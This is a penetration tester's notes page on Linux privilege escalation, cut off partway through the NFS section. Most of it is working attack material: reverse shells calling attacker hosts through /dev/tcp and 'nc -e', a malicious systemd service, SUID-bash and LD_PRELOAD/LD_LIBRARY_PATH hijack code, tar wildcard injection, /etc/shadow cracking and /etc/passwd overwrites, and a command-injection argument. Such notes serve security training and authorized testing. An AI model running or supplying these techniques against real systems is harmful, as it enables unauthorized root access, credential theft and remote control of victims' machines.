# Linux/Unix Privilege Escalation

## Linux Privilege Escalation

Our ultimate goal is to escalate from a low privileged user to a user that runs as an administrator user or as the root user. Privilege escalation may not always be based on a single misconfiguration, but rather on multiple misconfigurations. Many privilege escalations vectors might be considered access control violations.

## Preparation & Finding Compilers and/or Tools

Enumerate tools/languages that are installed:

```
find / -name perl*
find / -name python*
find / -name gcc*
find / -name cc
find / -name go
```

Enumerate tools for file transfers:

```
find / -name wget
find / -name curl
find / -name nc*
find / -name netcat*
find / -name tftp*
find / -name ftp
find / -name nfs
find / -name base64
```

## File Transfers Locations

These are the directories that we usually have write access to:

```
/dev/shm
/tmp
```

## Automated Enumeration Tools

### unix-privesc-check

{% embed url="http://pentestmonkey.net/tools/audit/unix-privesc-check" %}

Display Help:

```
./unix-privesc-check
```

Speed Check:

```
./unix-privesc-check standard > filename.txt
```

### LinEnum

{% embed url="https://github.com/rebootuser/LinEnum" %}

### **LSE**

{% embed url="https://github.com/diego-treitos/linux-smart-enumeration" %}

### linPEAS

{% embed url="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" %}

## Spawning Root Shells

This is used in situations where commands can be executed as root. We can create our own executable and execute it as root.

### C Executable

There may be instances where some root process executes another process that you can control. Knowing this, we can create our own executable:

```c
int main() {
    setuid(0);
    system("/bin/bash -p");
}
```

Compile the code:

```bash
gcc -o <name> <filename.c>
```

### Reverse Shells

Alternatively, if a reverse shell is preferred, msfvenom can be used to generate an executable (.elf) file:

{% embed url="https://nozerobit.gitbook.io/hacknotes/shells/msfvenom" %}

Otherwise, you may manually add shells to a file:

{% embed url="https://nozerobit.gitbook.io/hacknotes/shells/unix-linux-shells" %}

## System Information

### Operating System&#x20;

Enumerate the system distribution type and its version:

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null
cat /etc/issue
cat /etc/*-release
# Debian Based
cat /etc/lsb-release 
# Redhat Based
cat /etc/redhat-release
```

### Kernel Version

Enumerate the kernel version and architecture:

```bash
cat /proc/version
uname -a
uname -mrs
# RPM
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz
```

### Environment Variables

Enumerate environment variables to find information (like paths, passwords, API keys, programs, etc):

```bash
(env || set) 2>/dev/null
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
```

### Sudo Version

There are vulnerable sudo versions, it is worth it enumerating these:

```bash
sudo -v
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

## Users & Groups

Enumerate users with:

```
cat /etc/passwd

# Find users with a shell (bash,sh,zsh,fish,others)
cat /etc/passwd | grep sh$
```

### Groups

Enumerate your group:

```
id
groups
```

Find files with a particular group:

```
find / -group admin -ls 2>/dev/null 
```

## Un/Mounted File Systems

We enumerate mounted or unmounted file systems with:

```bash
mount
cat /etc/fstab # (not all drives are listed here, depends on the configuration)
/bin/lsblk # (list all available disk)
```

## Applications & Services

Enumerate the services that are running and their privilege:

```bash
ps aux
ps -ef
top
cat /etc/services
```

### Process running as root

Enumerate services that are running as the root user and identify if one is vulnerable to something:

```bash
ps aux | grep root
ps -ef | grep root
```

### Process Program Versions

Enumerate the version of the program that is running:

```bash
absolute/path/of/program_name --version
program_name --version
program_name -v
```

### Package Version

Enumerate the versions of the installed packages:

```bash
dpkg -l #Debian
rpm -qa #Redhat
dpkg -l | grep program_name #Debian
rpm -qa | grep program_name #Redhat
```

### Process Monitoring

We can use [pspy ](https://github.com/DominicBreuker/pspy)to dynamically monitor the processes are running in the system. Pspy is designed to snoop on processes without the need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute.&#x20;

```bash
git clone https://github.com/DominicBreuker/pspy
cd pspy
go build -ldflags "-s -w" main.go
upx main
mv main pspy
python3 -m http.server 80
```

On the victim machine, download pspy and execute it:

```
wget http://10.10.14.8/pspy
chmod +x pspy
./pspy
```

### Process Memory

Some services store credentials in plaintext in memory. Since the standard behavior is that low privileged users cannot read data from other users, this technique is most likely to be used when you're a root user but when your current user owns the process that contains the sensitive information then you can read since your user owns it.

#### Credentials in Memory

We can look up for case insensitive strings in a process as follows:

```
strings process_name | grep -i password
```

### Installed Applications

Enumerate which applications are installed, their version, and if they are currently running in the system:

```bash
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/
```

Enumerate useful binaries or tools:

```
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

### Services Configuration Files

Enumerate misconfigured services and if they have vulnerable plugins:

```bash
find / -iname '*.conf' 2>/dev/null
find / -iname '*.ini' 2>/dev/null
locate name_here.conf
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
```

Common configuration files are these:

```
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/nginx/nginx.conf
cat /etc/my.conf
cat /etc/php/<version_number_here>/php.ini
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
```

### Writable .service files

Enumerate if you have `.service` files that you could modify so it executes a shell when the service is started, restarted, or stopped. Sometimes you may need to reboot the machine.&#x20;

Enumerating `.service` files in the host:

```bash
find / -iname '*.service' 2>/dev/null
```

You can create a shell with something like `ExecStart=/tmp/shell.sh`&#x20;

### Writable service binaries

If we have writable binaries then we can modify them to execute shells when the service is restarted.

## Scheduled/Cron Jobs

Enumerate the scheduled jobs:

```bash
crontab -l
crontab -u username -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

Enumerate Cron Jobs with [pspy](https://github.com/DominicBreuker/pspy):

```bash
./pspy64 -pf -i 1000
```

### Crontabs Configuration Files

Review crontabs configuration files:

```
cat /var/spool/cron
cat /var/spool/cron/crontabs
cat /etc/crontab
```

Some things to take into consideration are:

* Is there a cronjob running as root?
* Does it have write permissions to these files?
  * If you do then try modifying the PATH environment variable or something alike.

#### Crontab Privilege Escalation

View the contents of the system-wide crontab:

```
$ cat /etc/crontab
...
* * * * * root script.sh
* * * * * root /usr/local/bin/script.sh
```

Find the script on the server:

```
$ locate script.sh
/usr/local/bin/script.sh
```

Enumerate the file’s permissions:

```
$ ls -l /usr/local/bin/script.sh
-rwxr--rw- 1 root john 40 May 15 2021 /usr/local/bin/script.sh
```

> Note that the file is world writable.

Add a reverse shell code in the script with the following:

```bash
#!/bin/bash

bash -i >& /dev/tcp/YOUR_IP/443 0>&1
```

Set up a listener in your host (e.g Kali or Parrot) and wait for the cron job to run. A reverse shell running as the root user should be received as soon as the script is executed by the cron:

```
# nc –nvlp 443
Listening on [any] 443 ...
Connect to [192.168.10.10] from (UNKNOWN) [192.168.10.11] 47555
bash: no job control in this shell
root@victim:~# id
id
uid=0(root) gid=0(root) groups=0(root)
```

### Crontab PATH Environment Variable

If a cron job program/script does **not use an absolute path**, and one of the PATH directories is **writable** by our user, we may be able to create a script with the same name as the cron job.

One way we can take exploit this is by doing a SUID bit on bash:

```bash
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

Then we make it executable:

```
chmod +x cron_job_name.sh
```

Now wait for the cron job to run, we can monitor it with:

```
watch -n 1 ls -l /tmp/rootbash
```

As soon as the cron job runs the script and places SUID bit which is represented as an `s` , then we can spawn bash shell as root with the `-p` option:

```
/tmp/rootbash -p
```

### Crontab Wildcards

Enumerate wildcards `*` in a file/script:

```
cat /path/to/cronjob_script.sh
```

If inside the script there's a line using a wildcard `*` like the following:

```bash
tar czf /tmp/filename.tar.gz *
```

With wildcards, we can execute anything and since that's the case then we can search in [GTFOBins](https://gtfobins.github.io) for a program, in this scenario `tar` and see what we can do, for example executing a shell.

When some command receives a wildcard character (\*) as an argument, the shell first expands the wildcard's filename, this is also known as globbing. A space-separated list of the current directory's file and directory names replaces the wildcard.

Run the following command to better understand what I mean with wildcards:

```bash
cd ~ && echo *
```

Unix/Linux filesystems are generally generous with filenames and filename expansion occurs before the command is executed, it is possible to communicate command-line options (e.g., -h, —help) to programs by creating files with these names.

The commands below should demonstrate how this works:

```
$ ls *
% touch ./-l
$ ls *
```

We can make filenames that correspond to complicated options:

```
--option=key=value
```

[GTFOBins](https://gtfobins.github.io) can assist us in determining whether a command contains any relevant command-line parameters for our needs.

#### Wildcards Privilege Escalation

Read the contents of the system-wide crontab:

```
$ cat /etc/crontab
...
* * * * * root /usr/local/bin/script.sh
```

Read the contents of the `/usr/local/bin/script.sh` file:

```bash
$ cat /usr/local/bin/script.sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

> Note that the tar command is run with a wildcard in the /home/user directory.

Visit [GTFOBins](https://gtfobins.github.io) and see what you can do with tar wildcards.

Use msfvenom to create a reverse shell ELF payload or manually create file with a reverse shell code:

```
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=443 -f elf -o shell.elf
```

Copy the file to the `/home/user` directory on the remote host and create two files in the `/home/user` directory:

```
$ touch /home/user/--checkpoint=1
$ touch /home/user/--checkpoint-action=exec=shell.elf
```

Set up a listener to receive a shell when the cron executes the script:

```
# nc -nvlp 443
listening on [any] 443 ...
connect to [192.168.10.10] from (UNKNOWN) [192.168.10.11] 47556
bash: no job control in this shell
root@debian:~# id
id
uid=0(root) gid=0(root) groups=0(root)
```

### Cron Script Overwrite

If you have **permission to modify a cron script executed by root**, then you can elevate privileges easily:

```bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /path/to/cron/script
# Wait until it executes
/tmp/rootbash -p
```

## Timers

## File Permissions

If a system file has confidential information we can read, it may be used to gain access to a higher privileged account. If a system file can be written to, we may be able to modify the way it works and gain higher privilege access.

Enumerate all writable files in /etc:

```bash
find /etc -maxdepth 1 -writable -type f 2>/dev/null
```

Enumerate all readable files in /etc:

```bash
find /etc -maxdepth 1 -readable -type f 2>/dev/null
```

Enumerate all directories which can be written to:

```bash
find / -executable -writable -type d 2>/dev/null
```

### /etc/shadow

The `/etc/shadow` file stores user password hashes and is read-only by default for all users except root. We might be able to crack the root user's password hash if we can see the contents of the /etc/shadow file. We can change the root user's password hash with one we know if we can modify the /etc/shadow file.

To see which encryption method the `/etc/shadow` file is using, we can use the following command:

```bash
cat /etc/login.defs | grep "ENCRYPT_METHOD"
```

#### Shadow Privilege Escalation

1.  Enumerate the permissions of the `/etc/shadow` file:

    ```
    $ ls -l /etc/shadow
    -rw-r—rw- 1 root shadow 810 May 15 2021 /etc/shadow
    ```

    > Note that it is world readable.
2.  Copy the root user’s password hash:

    ```
    $ head -n 1 /etc/shadow
    root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXv
    RDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
    ```
3.  Paste the password hash in a file (e.g. hash.txt):

    ```
    $ echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVl
    aXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash.txt'
    ```
4.  Crack the password hash using john:

    ```
    $ john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
    ...
    password123 (?)
    ```
5.  Authenticate with the password cracked:

    ```
    $ su
    Password:
    root@victim:/# id
    uid=0(root) gid=0(root) groups=0(root)
    ```

#### Alternative Shadow Privilege Escalation Method

1.  Enumerate the permissions of the /etc/shadow file:

    ```
    $ ls -l /etc/shadow
    -rw-r—rw- 1 root shadow 810 May 15 2021 /etc/shadow
    ```

    > Note that it is world writable.
2. Back up the contents of /etc/shadow so we can restore it later.
3.  Generate a new SHA-512 password hash with `mkpasswd`:

    ```
    $ mkpasswd -m sha-512 newpassword
    $6$DoH8o2GhA$5A7DHvXfkIQO1Zctb834b.SWIim2NBNys9D9h5wUvYK3IOGdxoOlL9VE
    WwO/okK3vi1IdVaO9.xt4IQMY4OUj/
    ```
4.  Modify the /etc/shadow and replace the root user’s password hash with the one you generated.

    ```
    root:$6$DoH8o2GhA$5A7DHvXfkIQO1Zctb834b.SWIim2NBNys9D9h5wUvYK3IOGdxoO
    lL9VEWwO/okK3vi1IdVaO9.xt4IQMY4OUj/:17298:0:99999:7:::
    ```
5.  Authenticate with the password cracked:

    ```
    $ su
    Password:
    root@victim:/# id
    uid=0(root) gid=0(root) groups=0(root)
    ```

### /etc/passwd

User password hashes were formerly stored in `/etc/passwd`. If the second field of a user row in contains a password hash, it takes precedence over the hash for backward compatibility.&#x20;

If we can only write to the file, we may also create a new user and give them the root user ID (0). Because Linux allows several entries for the same user ID as long as the usernames are distinct.

The root account in `/etc/passwd` is usually configured like this:

```
root:x:0:0:root:/root:/bin/bash
```

The “x” in the second field instructs Unix/Linux to search for the password hash in the /etc/shadow file. In some versions of Unix/Linux, it is possible to simply delete the “x”, which is interpreted as the user having no password:

```
root::0:0:root:/root:/bin/bash
```

#### /etc/passwd Privilege Escalation

1.  Enumerate the permissions of the /etc/passwd file:

    ```
    $ ls -l /etc/passwd
    -rw-r--rw- 1 root root 951 May 15 2021 /etc/passwd
    ```

    > Note that it is world writable.
2.  Generate a password hash for the password “password” with `openssl`:

    ```
    $ openssl passwd "password"
    L9yLGxncbOROc
    ```
3.  Modify the `/etc/passwd` file and paste the hash in the second field of the root user row:

    ```
    root:L9yLGxncbOROc:0:0:root:/root:/bin/bash
    ```
4.  Authenticate as the root user:

    ```
    $ su
    Password:
    # id
    uid=0(root) gid=0(root) groups=0(root)
    ```
5.  Alternatively, append a new row to the file `/etc/passwd` to create an alternate root user:

    ```
    rootuser:L9yLGxncbOROc:0:0:root:/root:/bin/bash
    ```
6.  Switch to the 'rootuser' user:

    ```
    $ su rootuser
    Password:
    # id
    uid=0(root) gid=0(root) groups=0(root)
    ```

### Backups

If a machine's permissions on crucial or sensitive files are how they should be, sometimes we may find a user's backups of these files, and maybe there are stored insecurely.

#### Backups Privilege Escalation

1.  Enumerate for interesting files, especially hidden files or directories:

    ```
    $ ls -la /home/username
    $ ls -la /
    $ ls -la /tmp
    $ ls -la /var/backups
    ```
2. You may find credentials, keys, programs, or something interesting/odd.

## Service Exploits

Exploiting vulnerable services that are executing as root can result in command execution as root.

### Services Running as Root

The following command will show all processes that are running as root:

```
$ ps aux | grep "^root"
```

### Enumerating Program Versions

Running the program with the --version/-v command-line option shows the version number:

```
<program> --version
<program> -v
dpkg -l | grep <program>
rpm –qa | grep <program>oftenoften
```

#### Service Privilege Escalation

1.  Enumerate the processes running as root:

    ```
    ps aux | grep "^root”
    ```
2.  Enumerate the version of the program or process that's running:

    ```
    <program> --version
    ```
3. Search for exploits.

## Malicious Service

To create a malicious service, the systemctl utility must executable by our current user or group:

```
SUID files:
-rwsr-x--- 1 root pepper 174520 Feb 19 05:18 /bin/systemctl       
```

A service is defined by a `.service` file. The `systemctl` is used to link it to `systemd`, and then used again to start the service. What the service does is defined by the `.service` file.

&#x20;[gtfobins](https://gtfobins.github.io/gtfobins/systemctl/) has a page for `systemctl`, and it gives an example where a single command is executed and output to a file in `tmp`.

```
pepper@jarvis:/dev/shm$ cat >evil.service<<EOF
[Service]
Type=notify
ExecStart=/bin/bash -c 'nc -e /bin/bash 10.10.16.8 443'
KillMode=process
Restart=on-failure
RestartSec=42s

[Install]
WantedBy=multi-user.target
EOF
```

Now link this service:

```
pepper@jarvis:/dev/shm$ systemctl link /dev/shm/evil.service
```

Now start the service, with a `nc` listener ready to catch the shell:

```
pepper@jarvis:/dev/shm$ systemctl start evil
```

Receive the shell:

```
kali@kali$ sudo nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.143.
Ncat: Connection from 10.10.10.143:37150.
id
uid=0(root) gid=0(root) groups=0(root)
```

## Passwords, Hashes, and Credentials

We can enumerate possible files that may contain credentials.

### Users

We can simply read the `/etc/passwd` file:

```bash
cat /etc/passwd
cat /etc/passwd | grep 'sh$'
```

### Configuration Files

Enumerate files that contain config:

```bash
find \-type f 2>/dev/null | grep "config" | xargs grep -i "password" 2>/dev/null
find \-type f 2>/dev/null | grep "config" | xargs grep -i -E "username|password|key|database" 2>/dev/null
find \-type f 2>/dev/null | grep "config" | xargs grep -i -E "username|password|key|database" 2>/dev/null | grep -v -E "debconf|keyboard"
```

Enumerate .conf files:

```bash
find / -name '*.conf' -type f 2>/dev/null | xargs grep -i -E "username|password|key|database" 2>/dev/null
```

#### .htpasswd

The `.htpasswd` may contain a password hash. It is often located in the webroot directory.

### History Files

Users' commands are recorded in history files when they are using specific programs. When a user types a password as part of a command, it may be saved in the history file. Switching to the root account with a found password is always a good idea.

### History Privilege Escalation

1.  View the contents of hidden files in the user’s home directory with filenames ending in “history”:

    ```
    cat ~/.*history | less
    history
    ```

### SSH Keys

To authenticate users using SSH, SSH keys can be used instead of passwords. SSH keys are split into two parts: a private key and a public key. The private key should be kept hidden at all times. If a user's private key is stored insecurely, anyone who has access to it may be able to authenticate to the server/target.

### Filter Password

We can enumerate recursively for the keywords:

```bash
grep -R -i 'password' / 2>/dev/null
grep -RiE 'password|username|key' / 2>/dev/null
```

## SUDO

sudo is a command-line application that allows users to run other programs with the security privileges of other users. By default, that other user will be root. A user must first enter their password and be allowed access via the `/etc/sudoers` file's rule before using sudo (s).

Run a program using with sudo privileges:

```
sudo <program>
```

Run a program as the specified user:

```
sudo -u <username> <program>
```

List the programs that a user is permitted to run and those that they are not permitted to run:

```
sudo -l
```

### SU

If your low privileged user account can use sudo and can run any programs and you know the user’s password you can switch the user with the `su` command to spawn a root shell:

```
sudo su
```

### SU Alternative Methods

If the `su` is not available for some reason, there are several other options for escalating privileges:

```
sudo -s
sudo -i
sudo /bin/bash
sudo passwd
```

### Shell Escape Sequences

Even though we are only allowed to run particular programs with sudo, we can sometimes "escape" the program and generate a shell.

Shell escape sequences can be found here:

{% embed url="https://gtfobins.github.io/" %}

#### Sudo Shell Escape Sequences Privilege Escalation

1. List the sudo-enabled applications for your user:

```
sudo -l
...
(root) NOPASSWD: /usr/sbin/iftop
(root) NOPASSWD: /usr/bin/find
(root) NOPASSWD: /usr/bin/nano
(root) NOPASSWD: /usr/bin/vim
(root) NOPASSWD: /usr/bin/man
(root) NOPASSWD: /usr/bin/awk
...
```

1. For a shell escape sequence for each program in the list, go to GTFOBins ([https://gtfobins.github.io/](https://gtfobins.github.io)).
2. Use sudo to launch the application and execute the escape sequence to create a root shell if one is available.

### Environment Variables

Environment variables can be retrieved from the user's environment by sudo programs. If the `env_reset` option is specified in the `/etc/sudoers` configuration file, sudo will run programs in a new, minimal environment. To keep some environment variables out of the user's environment, use the `env_retain` option. The environment variables are displayed starting with `env_` when you run `sudo -l`.

### LD\_PRELOAD

The environment variable `LD_PRELOAD` can be used to specify the location of a shared object (.so) file. When this option is enabled, the shared object will be loaded first. We can run code as soon as the object is loaded by building a custom shared object and an init() function.

#### Limitations

LD PRELOAD will fail if the effective user ID differs from the genuine user ID. Sudo must use the env keep option to retain the LD PRELOAD environment setting.

#### Sudo LD\_PRELOAD Privilege Escalation

1. List the programs that your user has permission to run with sudo:

```
$ sudo -l
Matching Defaults entries for user on this host:
env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
...
```

> Note that the env\_keep option includes the LD\_PRELOAD environment variable.

Create a file (preload.c) with the following contents:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```

Compile preload.c to preload.so:

```bash
$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```

Set the `LD_PRELOAD` environment variable to the full path of the preload and run any permitted program using `sudo` as a result, file:

```bash
$ sudo LD_PRELOAD=/tmp/preload.so <program>
# id
uid=0(root) gid=0(root) groups=0(root)
```

### LD\_LIBRARY\_PATH

The `LD_LIBRARY_PATH` environment variable specifies which directories should be examined first for shared libraries.

The **ldd** command can be used to print a program's shared libraries (.so files):

```
ldd /usr/sbin/program_name
```

If we construct a shared library with the same name and set `LD_LIBRARY_PATH` to its parent directory, the program will load our shared library instead of the one utilized by the program.

#### Sudo LD\_LIBRARY\_PATH Privilege Escalation

1. Run **ldd** against the program file:

```
$ ldd /usr/sbin/program_name
    linux-vdso.so.1 => (0x00007fff063ff000)
    ...
    libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f7d4199d000)
    libdl.so.2 => /lib/libdl.so.2 (0x00007f7d41798000)
    libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f7d41570000)
    /lib64/ld-linux-x86-64.so.2 (0x00007f7d42e84000)
```

> Hijacking shared objects using this method is hit or miss. Choose one from the list and try it, if it fails try another one.

Create a file (library\_path.c) with the following code:

```c
#include <stdio.h>
#include <stdlib.h>
static void hijack() __attribute__((constructor));

void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```

Compile library\_path.c into the correct `.so` file:

```bash
gcc -o <lib_name.so.1> -shared -fPIC library_path.c
```

Run the program using sudo, while setting the LD\_LIBRARY\_PATH environment variable to the path where the code was compiled

```bash
$ sudo LD_LIBRARY_PATH=. <program_name>
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Sticky Bits and SUID/SGID&#x20;

### Sticky Bits and SUID/SGID Enumeration

```bash
find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
```

### Known Exploits

SUID files are used by several programs to facilitate their operation. These SUID files, run as root, and can contain vulnerabilities that we can exploit for a root shell.&#x20;

#### Known Exploits Privilege Escalation

1.  Find SUID/SGID files on the target:

    ```
    $ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
    ```
2.  Find the version of the binary:

    ```
    program -v
    program --version
    ```
3.  Using searchsploit on our localhost, we can try to find local privilege escalation for the program:

    ```
    searchsploit <program>
    ```
4.  Make sure the script is executable:

    ```
    chmod +x exploit.sh
    ```
5.  Execute the script to gain a root shell:

    ```
    $ ./privesc.sh
    # id
    uid=0(root) gid=1000(user) groups=0(root)
    ```

### Shared Object Injection

When a program is run, it tries to load the shared objects it needs. We may use strace to monitor these system calls and see if any shared objects are missing. We can build a shared object and start a root shell when the program is loaded if we can write to the location the program wants to open.

#### Shared Object Injection Privilege Escalation

1.  Enumerate SUID/SGID files on the target:

    ```
    $ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
    ```
2.  Run strace on the SUID file:

    ```
    $ strace /usr/local/bin/binary_name 2>&1 | grep -iE "open|access|no such file"
    ```
3.  Create the necessary file `<required_name.c>` with the following code:

    ```
    #include <stdio.h>
    #include <stdlib.h>

    static void inject() __attribute__((constructor));

    void exec_bash() {
    	setuid(0);
    	system("/bin/bash -p");
    }
    ```
4.  Compile the `.so` file:

    ```
    gcc -shared -fPIC -o filname.so filename.c
    ```
5.  Run the SUID executable to get a root shell:

    ```
    $ /usr/local/bin/suid-so
    # id
    uid=0(root) gid=1000(user) ..
    ```

### SUID PingSys

Run the following command on our shell to escalate to a root shell:

```
/usr/bin/pingsys '127.0.0.1; /bin/sh'
```

### PATH Environment Variable

A list of directories where the shell should look for applications is stored in the PATH environment variable. If a program attempts to run another program but only specifies the program name rather than the absolute path, the shell will look through the PATH directories until it finds it. We can tell the shell to hunt for programs in a directory we can write to first because a user has complete control over their PATH variable.

* Relative Path: id
* Absolute Path: /usr/bin/id

#### Finding Vulnerable Programs

If software tries to run another program, the name of that application is almost certainly stored as a string in the executable file. We can perform inspect the binaries.&#x20;

{% embed url="https://nozerobit.gitbook.io/hacknotes/reversing/inspecting-binaries" %}

Running strings against a file:

```
strings /path/to/file
```

Running strace against a command:

```
strace -v -f -e execve <command> 2>&1 | grep exec
```

Running ltrace against a command:

```
ltrace <command>
```

#### Finding SUID/SGID Vulnerable Privilege Escalation

1.  Enumerate SUID/SGID files on the target:

    ```
    find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
    ```
2.  Enumerate the strings on the SUID file:

    ```
    strings /usr/local/bin/binary
    ```
3.  We can verify if it executes a service or file with strace:

    ```
    strace -v -f -e execve /usr/local/bin/binary 2>&1 | grep service
    ```
4.  Alternatively, we can also verify with ltrace:

    ```
    ltrace /usr/local/bin/binary 2>&1
    ```
5.  Create a file named service.c with the following contents:

    ```
    int main() {
     setuid(0);
     system("/bin/bash -p");
    }
    ```
6.  Compile service.c into a file called service:

    ```
    gcc -o service service.c
    ```
7.  Prepend the current directory to the `$PATH` environment variable, and execute the SUID file to execute a root shell:

    ```
    PATH=.:$PATH /usr/local/bin/binary
    root@victim:~# id
    uid=0(root) gid=0(root) groups=0(root) ...
    ```

An alternative way to modify the $PATH environment variable is:

```bash
export PATH=/<directory>:$PATH
```

### Bash <4.2-048

It is possible to define user functions with an absolute pathname.

#### Bash <4.2-048 Privilege Escalation

1.  Enumerate SUID/SGID files on the target:

    ```
    find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
    ```
2.  Enumerate the programs that binary runs with strings:

    ```
    strings /usr/local/bin/binary_name
    ```
3.  We can verify which program is calling with strace:

    ```
    strace -v -f -e execve /usr/local/bin/binary_name 2>&1
    ```
4.  Alternatively, we can also verify with ltrace:

    ```
    ltrace /usr/local/bin/binary_name 2>&1 
    ```
5.  Verify the version of Bash is lower than 4.2-048:

    ```
    $ bash --version
    GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
    ```
6.  Create a Bash function with the name “/usr/sbin/serviceCalled” (change this to the actual name of the program being called) and export the function:

    ```
    function /usr/sbin/serviceCalled { /bin/bash -p; }
    export –f /usr/sbin/serviceCalled
    ```
7.  Execute the SUID file for a root shell:

    ```
    $ /usr/local/bin/binary_name
    root@victim:~# id
    uid=0(root) gid=0(root) groups=0(root) ...
    ```

### SHELLOPTS

.

#### SHELLOPTS Privilege Escalation

1.  Enumerate SUID/SGID files on the target:

    ```
    find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
    ```
2.  Enumerate strings on the SUID file:

    ```
    strings /usr/local/bin/binary_name
    ```
3.  The binary may be trying to include a file, we can verify this with strace:

    ```
    strace -v -f -e execve /usr/local/bin/binary_name 2>&1
    ```
4.  Alternatively, we can also verify with ltrace:

    ```
    ltrace /usr/local/bin/binary_name 2>&1
    ```
5.  Run the SUID file with bash debugging enabled and the PS4 variable assigned to our payload:

    ```
    env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/robash; chown root /tmp/rootbash; chmod +s /tmp/robash)' /usr/local/bin/binary_name
    ```
6.  Run the robash with the -p option to get a root shell:

    ```
    /tmp/robash -p
    rootbash-4.1# id
    uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) ...
    ```

## Capabilities

Enumerate capabilities in general with:

```bash
getcap -r / 2>/dev/null
```

Alternatively, we can enumerate with find:

```bash
find / -exec getcap {} \; 2>/dev/null
```

### Capabilities Privilege Escalation

{% embed url="https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/" %}

Example with python3:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

```
username@victim:~$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## NFS

The NFS (Network File System) file system is a widely used distributed file system. The /etc/exports file is used to set up NFS shares. Remote users can access, create, and modify files, as well as mount shares. Even if they don't exist on the NFS server, new files inherit the remote user's and group's ids (as owner and group, respectively).

Show the export list for the NFS server:

```
showmount -e <target>
```

Nmap NSE script:

```
nmap –sV –script=nfs-showmount <target>
```

Mount an NFS share:

```
mount -o rw,vers=2 <target>:<share> <local_directory>
```

### Root Squashing

NFS uses root squashing by default to prevent privilege escalation, however, this configuration may be disabled. If the remote user is or claims to be root, NFS will “squash” the user and treat them as the “nobody” user, belonging to the “nogroup” group.

### no\_root\_squash

Root squashing is disabled via the no\_root\_squash NFS configuration option. A remote user who identifies as "root" and is included in a writable share configuration can create files on the NFS share as the root user.

#### no\_root\_squash Privilege Escalation

1.  With the no\_root\_squash option, check the contents of /etc/exports for shares:

    ```
    cat /etc/exports
    ...
    /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
    ```
2.  Ensure that the NFS share is accessible from a remote location:

    ```
    $ showmount -e 192.168.1.10
    Exports list on 192.168.1.10:
    /tmp
    ```
3.  Mount the /tmp NFS share on your local system by creating a mount point:

    ```
    mkdir /tmp/nfs
    mount -o rw,vers=2 192.168.10.10:/tmp /tmp/nfs
    ```
4.  Create a payload and store it to the mounted share as the root user on your localhost (e.g Kali or Parrot):

    ```
